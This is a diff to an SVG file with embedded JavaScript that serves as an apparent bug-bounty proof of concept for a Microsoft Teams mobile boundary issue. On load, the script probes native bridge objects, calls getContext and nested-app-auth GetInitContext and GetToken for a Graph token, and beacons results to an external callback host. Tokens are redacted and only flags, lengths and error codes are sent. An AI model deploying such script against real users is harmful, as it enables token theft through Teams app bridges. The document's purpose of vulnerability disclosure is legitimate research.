@@ -3,7 +3,7 @@
   <rect width="1100" height="760" fill="#0b1020"/>
   <rect x="26" y="24" width="1048" height="712" rx="10" fill="#101827" stroke="#38507a" stroke-width="2"/>
   <text x="52" y="66" fill="#f8fafc" font-family="monospace" font-size="24" font-weight="700">Ofek Levin MSRC Teams Mobile App Boundry Report</text>
-  <text x="52" y="100" fill="#93c5fd" font-family="monospace" font-size="15">Local display only. Raw tokens are not printed, stored globally, or sent off-device.</text>
+  <text x="52" y="100" fill="#93c5fd" font-family="monospace" font-size="15">Raw tokens are not printed or sent. Callback sends only booleans/error codes for evidence.</text>
   <text id="status" x="52" y="138" fill="#dbeafe" font-family="monospace" font-size="14">starting...</text>
   <foreignObject x="52" y="160" width="996" height="548">
     <div xmlns="http://www.w3.org/1999/xhtml" id="log" style="height:548px;overflow:auto;white-space:pre-wrap;word-break:break-word;color:#dbeafe;background:#050914;border:1px solid #334155;border-radius:8px;padding:14px;font:13px/1.45 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;"></div>
@@ -15,6 +15,7 @@
   var APP_CLIENT_ID = "03abeb20-8ed4-4331-bf1c-31e607ee4e50";
   var GRAPH_SCOPE = "https://graph.microsoft.com/User.Read";
   var AUTHORITY = "https://login.microsoftonline.com/common";
+  var CALLBACK_BASE = "https://teams.solarflare.cloud/poc";
   var nativeNextId = 73000;
   var nativePending = {};
   var previousNativeHandler = window.onNativeMessage;
@@ -34,6 +35,24 @@
     if (logEl) logEl.textContent += line;
     if (logEl) logEl.scrollTop = logEl.scrollHeight;
     try { console.log("[ofek-msrc-teams-boundary]", label, safe); } catch (_) {}
+  }
+
+  function callback(eventName, fields) {
+    try {
+      var query = new URLSearchParams();
+      query.set("marker", "ofek-msrc-teams-boundary-20260529");
+      query.set("event", eventName);
+      query.set("ts", new Date().toISOString());
+      query.set("origin_host", location.host || "");
+      Object.keys(fields || {}).forEach(function (key) {
+        var value = fields[key];
+        if (value === undefined || value === null) return;
+        query.set(key, String(value).slice(0, 180));
+      });
+      var img = new Image();
+      img.referrerPolicy = "no-referrer";
+      img.src = CALLBACK_BASE + "?" + query.toString();
+    } catch (_) {}
   }
 
   function stringify(value) {
@@ -299,13 +318,21 @@
       host: location.host,
       userAgent: navigator.userAgent
     });
+    callback("start", { host: location.host });
     await waitForBridge(6000);
-    write("bridge objects", {
+    var bridgeState = {
       nativeInterface: !!window.nativeInterface,
       framelessPostMessage: !!(window.nativeInterface && window.nativeInterface.framelessPostMessage),
       webAppMessageListener: !!window.webAppMessageListener,
       nestedAppAuthBridge: !!window.nestedAppAuthBridge,
       microsoftTeams: !!window.microsoftTeams
+    };
+    write("bridge objects", bridgeState);
+    callback("bridge", {
+      nativeInterface: bridgeState.nativeInterface ? 1 : 0,
+      webAppMessageListener: bridgeState.webAppMessageListener ? 1 : 0,
+      nestedAppAuthBridge: bridgeState.nestedAppAuthBridge ? 1 : 0,
+      microsoftTeams: bridgeState.microsoftTeams ? 1 : 0
     });
 
     sendNativeEvent("initialize", [], -1);
@@ -317,16 +344,35 @@
       var context = await callNative("getContext", [], 10000);
       write("getContext result summary", summarizeContext(context));
       write("getContext raw with token-like fields redacted", context);
+      callback("getContext", {
+        ok: 1,
+        summaryKeyCount: Object.keys(summarizeContext(context)).length
+      });
     } catch (e) {
       write("getContext error", String(e && e.message || e));
+      callback("getContext", {
+        ok: 0,
+        error: String(e && e.message || e).slice(0, 120)
+      });
     }
 
     setStatus("calling nestedAppAuthBridge.GetInitContext...");
     try {
       var init = await callNestedAppAuth(nestedPayload("GetInitContext"), 20000);
       write("nestedAppAuthBridge GetInitContext summary", summarizeNaa(init));
+      var initSummary = summarizeNaa(init);
+      callback("naaInit", {
+        success: initSummary.success ? 1 : 0,
+        initAccountPresent: initSummary.initContext && Object.keys(initSummary.initContext).length ? 1 : 0,
+        errorStatus: initSummary.errorStatus || "",
+        errorCode: initSummary.errorCode || ""
+      });
     } catch (e) {
       write("nestedAppAuthBridge GetInitContext error", String(e && e.message || e));
+      callback("naaInit", {
+        success: 0,
+        error: String(e && e.message || e).slice(0, 120)
+      });
     }
 
     setStatus("requesting redacted Graph User.Read token...");
@@ -338,13 +384,30 @@
         authority: params.authority
       });
       var tokenResponse = await callNestedAppAuth(nestedPayload("GetToken", params), 30000);
-      write("nestedAppAuthBridge GetToken redacted summary", summarizeNaa(tokenResponse));
+      var tokenSummary = summarizeNaa(tokenResponse);
+      write("nestedAppAuthBridge GetToken redacted summary", tokenSummary);
       write("nestedAppAuthBridge GetToken response with token-like fields redacted", tokenResponse);
+      callback("naaGetToken", {
+        success: tokenSummary.success ? 1 : 0,
+        tokenPresent: tokenSummary.tokenPresent ? 1 : 0,
+        accessTokenPresent: tokenSummary.accessTokenPresent ? 1 : 0,
+        idTokenPresent: tokenSummary.idTokenPresent ? 1 : 0,
+        accessTokenLength: tokenSummary.accessTokenLength || 0,
+        idTokenLength: tokenSummary.idTokenLength || 0,
+        errorStatus: tokenSummary.errorStatus || "",
+        errorCode: tokenSummary.errorCode || "",
+        errorSubError: tokenSummary.errorSubError || ""
+      });
     } catch (e) {
       write("nestedAppAuthBridge GetToken error", String(e && e.message || e));
+      callback("naaGetToken", {
+        success: 0,
+        error: String(e && e.message || e).slice(0, 120)
+      });
     }
 
     setStatus("complete - review output below");
+    callback("complete", { done: 1 });
   }
 
   if (document.readyState === "loading") {
